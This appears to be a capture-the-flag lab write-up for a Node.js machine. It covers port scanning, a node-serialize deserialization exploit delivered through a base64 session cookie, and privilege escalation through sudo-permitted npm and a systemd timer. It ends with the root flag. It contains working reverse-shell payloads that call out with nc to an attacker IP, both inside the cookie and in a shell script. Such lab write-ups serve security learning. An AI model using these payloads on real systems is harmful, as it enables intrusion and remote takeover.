# [Machine]()
# ENUM
## nmap(`nmap -A -p- -T4 --min-rate 5000 vulnnetnode.thm`)
```nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:66:31:eb:0a:b1:da:25:4b:ed:2f:c4:3f:65:32:5e (RSA)
|   256 d8:cf:85:4d:63:35:6b:fc:c2:e7:55:87:43:56:ef:bc (ECDSA)
|_  256 42:ea:99:ba:fa:ec:cd:46:43:28:bd:4f:23:02:45:61 (ED25519)
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# EXPLOITATION
In `/login` there's a session cookie base64 encoded: let's modify its values.
`eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==` (`{"username":"Guest","isGuest":true,"encoding": "utf-8"}')` -> `eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNHdWVzdCI6ZmFsc2UsImVuY29kaW5nIjogInV0Zi04In0=`(`{"username":"Admin","isGuest":false,"encoding": "utf-8"}`)
Nothing happened, let's check deleting part of our cookie:
```
SyntaxError: Unexpected token S in JSON at position 0  
    at JSON.parse (<anonymous>)  
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)  
    at /home/www/VulnNet-Node/server.js:16:24  
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)  
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)  
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)  
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)  
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22  
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)  
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```
The `node-serialize` is vulnerable to `CVE-2017-5941: Node.JS - 'node-serialize' Remote Code Execution`.
Let's inject this cookie: `eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTAuOC4xMy4xMTEgNDQ0NCA+L3RtcC9mJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9` (`{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.13.111 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}`)
We got a revshell!
# PRIVILEGE ESCALATION
For `user.txt`, we need the `serv-manage` permissions. 
`sudo -l`: `(serv-manage) NOPASSWD: /usr/bin/npm`
Let's check on GTFOBins:
```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
sudo -u serv-manage /usr/bin/npm -C . --unsafe-perm i
```
We're `serv-manage`! (P.S.: the new temporary directory must be writable by everyone, like `/tmp`).
Let's spawn an interactive shell:  `python3 -c "import pty;pty.spawn('/bin/bash')"`
`sudo -l`
```bash
(root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl daemon-reload
```

 ```bash
 $ locate vulnnet-auto.timer
 /etc/systemd/system/vulnnet-auto.timer
 ```

`vulnnet-auto.timer`:
```bash
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

`/etc/systemd/system/vulnnet-job.service`:
```bash
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```
Let's change the `ExecStart` line to `/tmp/shell` and let's create a script:
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.13.111 5555 >/tmp/f
```
Let's restart the services:
```bash
$ sudo -u root /bin/systemctl stop vulnnet-auto.timer
$ sudo -u root /bin/systemctl daemon-reload
$ sudo -u root /bin/systemctl start vulnnet-auto.timer
```
We're ROOT!
`root.txt`: `THM{abea728f211b105a608a720a37adabf9}`

